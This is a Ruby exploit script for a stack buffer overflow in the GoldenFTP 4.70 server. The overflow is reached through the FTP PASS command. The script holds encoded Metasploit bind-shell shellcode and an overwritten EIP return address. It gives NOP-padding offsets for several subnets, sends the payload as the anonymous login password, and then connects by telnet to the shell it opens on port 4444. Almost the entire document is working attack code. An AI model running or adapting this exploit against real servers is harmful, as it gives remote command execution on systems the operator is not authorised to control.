#GoldenFTP 4.70 PASS Exploit
#Authors: Craig Freyman (cd1zz) and Gerardo Iglesias Galvan (iglesiasgg)
#Tested on XP SP3 
#Vendor Contacted: 1/17/2011 (no response)
#For this exploit to work correctly, you need to know the subnet that the server 
#is running on. You also need to make sure that "show new connections" is checked in the options.
#The total length of the buffer should be 4 bytes less than the offset, with EIP at the end.
#528 is the offset when server running on 192.168.236.0 
#533 is the offset when server running on 10.0.1.0 
#530 is the offset when server running on 192.168.1.0 
#531 is the offset when server running on 172.16.1.0 

require 'net/ftp'

#Metasploit bind shell port=4444 | shikata_ga_nai | 369 bytes
shellcode = ("\x2b\xc9\xb1\x56\xba\x96\x70\x11\x9e\xdb\xd0\xd9\x74\x24" +
"\xf4\x58\x31\x50\x10\x03\x50\x10\x83\xe8\xfc\x74\x85\xed" +
"\x76\xf1\x66\x0e\x87\x61\xee\xeb\xb6\xb3\x94\x78\xea\x03" +
"\xde\x2d\x07\xe8\xb2\xc5\x9c\x9c\x1a\xe9\x15\x2a\x7d\xc4" +
"\xa6\x9b\x41\x8a\x65\xba\x3d\xd1\xb9\x1c\x7f\x1a\xcc\x5d" +
"\xb8\x47\x3f\x0f\x11\x03\x92\xbf\x16\x51\x2f\xbe\xf8\xdd" +
"\x0f\xb8\x7d\x21\xfb\x72\x7f\x72\x54\x09\x37\x6a\xde\x55" +
"\xe8\x8b\x33\x86\xd4\xc2\x38\x7c\xae\xd4\xe8\x4d\x4f\xe7" +
"\xd4\x01\x6e\xc7\xd8\x58\xb6\xe0\x02\x2f\xcc\x12\xbe\x37" +
"\x17\x68\x64\xb2\x8a\xca\xef\x64\x6f\xea\x3c\xf2\xe4\xe0" +
"\x89\x71\xa2\xe4\x0c\x56\xd8\x11\x84\x59\x0f\x90\xde\x7d" +
"\x8b\xf8\x85\x1c\x8a\xa4\x68\x21\xcc\x01\xd4\x87\x86\xa0" +
"\x01\xb1\xc4\xac\xe6\x8f\xf6\x2c\x61\x98\x85\x1e\x2e\x32" +
"\x02\x13\xa7\x9c\xd5\x54\x92\x58\x49\xab\x1d\x98\x43\x68" +
"\x49\xc8\xfb\x59\xf2\x83\xfb\x66\x27\x03\xac\xc8\x98\xe3" +
"\x1c\xa9\x48\x8b\x76\x26\xb6\xab\x78\xec\xc1\xec\xb6\xd4" +
"\x81\x9a\xba\xea\x34\x06\x32\x0c\x5c\xa6\x12\x86\xc9\x04" +
"\x41\x1f\x6d\x77\xa3\x33\x26\xef\xfb\x5d\xf0\x10\xfc\x4b" +
"\x52\xbd\x54\x1c\x21\xad\x60\x3d\x36\xf8\xc0\x34\x0e\x6a" +
"\x9a\x28\xdc\x0b\x9b\x60\xb6\xa8\x0e\xef\x47\xa7\x32\xb8" +
"\x10\xe0\x85\xb1\xf5\x1c\xbf\x6b\xe8\xdd\x59\x53\xa8\x39" +
"\x9a\x5a\x30\xcc\xa6\x78\x22\x08\x26\xc5\x16\xc4\x71\x93" +
"\xc0\xa2\x2b\x55\xbb\x7c\x87\x3f\x2b\xf9\xeb\xff\x2d\x06" +
"\x26\x76\xd1\xb6\x9f\xcf\xed\x76\x48\xd8\x96\x6b\xe8\x27" +
"\x4d\x28\x18\x62\xcc\x18\xb1\x2b\x84\x19\xdc\xcb\x72\x5d" +
"\xd9\x4f\x77\x1d\x1e\x4f\xf2\x18\x5a\xd7\xee\x50\xf3\xb2" +
"\x10\xc7\xf4\x96\x1b")

puts "[*]This exploit requires knowledge of the local \n[*]subnet the ftp server is running on."
puts "[*]It will not work unless it is one of these: \n-->10.0.1.0\n-->192.168.1.0\n-->172.16.1.0\n-->192.168.236.0\n[*]If your subnet isn't listed, figure out the offset on your own."
puts "[*]Enter the IP of the GoldenFTP Server"
host = gets.chomp    

#Get the subnet so we can figure out the offset
puts "Which subnet is the FTP server running on?"
puts "1 --> 10.0.1.0" 
puts "2 --> 192.168.1.0" 
puts "3 --> 172.16.1.0" 
puts "4 --> 192.168.236.0" 
subnet = gets.chomp 
                                     
junk = "\x01" + "\x90" * 19
eip = "\x4e\xae\x45\x7e"

padto529 = "\x90" * 136
padto527 = "\x90" * 134
padto526 = "\x90" * 133
padto524 = "\x90" * 131
 
if subnet =="1"
	buffer = junk + shellcode + padto529 + eip # buffer is 529 total bytes
elsif subnet =="2"
	buffer = junk + shellcode + padto526 + eip # buffer is 526 total bytes
elsif subnet =="3"
	buffer = junk + shellcode + padto527 + eip # buffer is 527 total bytes
elsif subnet =="4"
	buffer = junk + shellcode + padto524 + eip # buffer is 524 total bytes
end

ftp = Net::FTP.new(host)
 
puts "++ Connecting to target...\n"
 
ftp.login(user="anonymous", passwd=(buffer))                       
ftp.passive = true

sleep(2)
 
ftp.close

puts "++ Connecting to target on port 4444....\n"
sleep(2)

command= "telnet "+ host +" 4444"
 
system(command)